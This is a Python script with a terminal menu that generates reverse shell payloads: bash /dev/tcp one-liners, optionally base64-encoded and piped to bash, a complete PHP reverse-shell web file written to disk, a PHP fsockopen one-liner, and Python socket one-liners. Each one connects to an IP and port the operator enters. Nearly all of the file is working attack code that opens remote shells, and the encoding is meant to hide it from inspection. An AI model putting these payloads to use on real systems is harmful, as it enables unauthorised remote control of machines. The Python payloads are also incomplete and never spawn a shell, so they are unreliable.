from simple_term_menu import TerminalMenu
import base64

def main_menu():
    options = ["Bash", "PHP", "Python", "Exit"]

    main_menu = TerminalMenu(options, title="--- Select a reverse shell type ---")
    menu_entry_index = main_menu.show()

    if menu_entry_index is None:
        print("No option selected. Exiting.")
        return

    selected_option = options[menu_entry_index]

    if selected_option == "Exit":
        print("Exiting the script.")
        return

    if selected_option == "Bash":
        bash_reverse_shell()
    
    elif selected_option == "PHP":
        php_reverse_shell()
    
    elif selected_option == "Python":
        python_reverse_shell()

def bash_reverse_shell():
    bash_options = ["Encrypted Bash", "Plaintext Bash", "Back to Main Menu"]
    bash_menu = TerminalMenu(bash_options, title="--- Select a Bash reverse shell type ---")
    bash_menu_entry_index = bash_menu.show()

    if bash_menu_entry_index is None:
        print("No option selected. Returning to main menu.")
        main_menu()

    selected_bash_option = bash_options[bash_menu_entry_index]

    if selected_bash_option == "Back to Main Menu":
        main_menu()

    elif selected_bash_option == "Encrypted Bash":
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
        base64_command = encode(command)
        print(f"\n\n\nCommand: echo {base64_command} | base64 -d | bash")

    elif selected_bash_option == "Plaintext Bash":
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
        print(f"Command: {command}")
        

def php_reverse_shell():
    php_option = ["PHP web file", "PHP command", "Back to Main Menu"]
    php_menu = TerminalMenu(php_option, title="--- Select a PHP reverse shell type ---")
    php_menu_entry_index = php_menu.show()

    if php_menu_entry_index is None:
        print("No option selected. Returning to main menu.")
        main_menu()

    selected_php_option = php_option[php_menu_entry_index]
    if selected_php_option == "Back to Main Menu":
        main_menu()

    if selected_php_option == "PHP web file":
        local_ip = input("Enter your IP address: ").strip()
        local_port = input("Enter the port netcat will be listening (tipically 4444): ").strip()
        php_web_file = """<?php
                set_time_limit (0);
                $VERSION = "1.0";
                $ip = '__IP__';
                $port = __PORT__;
                $chunk_size = 1400;
                $write_a = null;
                $error_a = null;
                $shell = 'uname -a; w; id; /bin/sh -i';
                $daemon = 0;
                $debug = 0;




                if (function_exists('pcntl_fork')) {                   
                    $pid = pcntl_fork();
                    
                    if ($pid == -1) {
                        printit("ERROR: Can't fork");
                        exit(1);
                    }
                    
                    if ($pid) {
                        exit(0);  // Parent exits
                    }

                    // Make the current process a session leader
                    // Will only succeed if we forked
                    if (posix_setsid() == -1) {
                        printit("Error: Can't setsid()");
                        exit(1);
                    }

                    $daemon = 1;
                } else {
                    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
                }


                $sock = fsockopen($ip, $port, $errno, $errstr, 30);
                if (!$sock) {
                    printit("$errstr ($errno)");
                    exit(1);
                }


                $descriptorspec = array(
                0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                2 => array("pipe", "w")   // stderr is a pipe that the child will write to
                );

                $process = proc_open($shell, $descriptorspec, $pipes);

                if (!is_resource($process)) {
                    printit("ERROR: Can't spawn shell");
                    exit(1);
                }


                stream_set_blocking($pipes[0], 0);
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);
                stream_set_blocking($sock, 0);

                printit("Successfully opened reverse shell to $ip:$port");

                while (1) {
                    // Check for end of TCP connection
                    if (feof($sock)) {
                        printit("ERROR: Shell connection terminated");
                        break;
                    }

                    // Check for end of STDOUT
                    if (feof($pipes[1])) {
                        printit("ERROR: Shell process terminated");
                        break;
                    }

                    // Wait until a command is end down $sock, or some
                    // command output is available on STDOUT or STDERR
                    $read_a = array($sock, $pipes[1], $pipes[2]);
                    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

                    // If we can read from the TCP socket, send
                    // data to process's STDIN
                    if (in_array($sock, $read_a)) {
                        if ($debug) printit("SOCK READ");
                        $input = fread($sock, $chunk_size);
                        if ($debug) printit("SOCK: $input");
                        fwrite($pipes[0], $input);
                    }

                    // If we can read from the process's STDOUT
                    // send data down tcp connection
                    if (in_array($pipes[1], $read_a)) {
                        if ($debug) printit("STDOUT READ");
                        $input = fread($pipes[1], $chunk_size);
                        if ($debug) printit("STDOUT: $input");
                        fwrite($sock, $input);
                    }

                    // If we can read from the process's STDERR
                    // send data down tcp connection
                    if (in_array($pipes[2], $read_a)) {
                        if ($debug) printit("STDERR READ");
                        $input = fread($pipes[2], $chunk_size);
                        if ($debug) printit("STDERR: $input");
                        fwrite($sock, $input);
                    }
                }

                fclose($sock);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);

                // Like print, but does nothing if we've daemonised ourself
                // (I can't figure out how to redirect STDOUT like a proper daemon)
                function printit ($string) {
                            if (!$daemon) {
                                print "$string\n";
                            }
                        }

                ?>"""
        final_php_web_file = php_web_file.replace("__IP__", local_ip).replace("__PORT__", local_port)

        file_name = input("How do you want to save the file? Add the path if you want to save it somewhere else: ")

        try:
            with open(file_name, "w", encoding="utf-8") as file:
                file.write(final_php_web_file)
            print(f"PHP web file saved as {file_name}")
        except IOError as e:
            print(f"Error during file creation: {e}")

    if selected_php_option == "PHP command":
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        php_command = f"php -r '$sock=fsockopen(\"{local_ip}\",{local_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        print(f"Command: {php_command}")
def python_reverse_shell():
    python_options = ["Encrypted Python", "Plaintext Python", "Back to Main Menu"]
    python_menu = TerminalMenu(python_options, title="--- Select a Python reverse shell type ---")
    python_menu_entry_index = python_menu.show()

    if python_menu_entry_index is None:
        print("No option selected. Returning to main menu.")
        main_menu()

    selected_python_option = python_options[python_menu_entry_index]

    if selected_python_option == "Back to Main Menu":
        main_menu()

    elif selected_python_option == "Encrypted Python":
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{local_ip}\",{local_port}));'"
        )
        base64_command = encode(command)
        print(f"\n\n\nCommand: echo {base64_command} | base64 -d | python")

    elif selected_python_option == "Plaintext Python":
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = (
            "python -c 'import socket,subprocess,os;"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{local_ip}\",{local_port}));'"
        )
        print(f"Command: {command}")

def encode(command):
    command_bytes = command.encode('ascii')
    base64_bytes = base64.b64encode(command_bytes)
    base64_command = base64_bytes.decode('ascii')
    return base64_command
    
if __name__ == "__main__":
    main_menu()
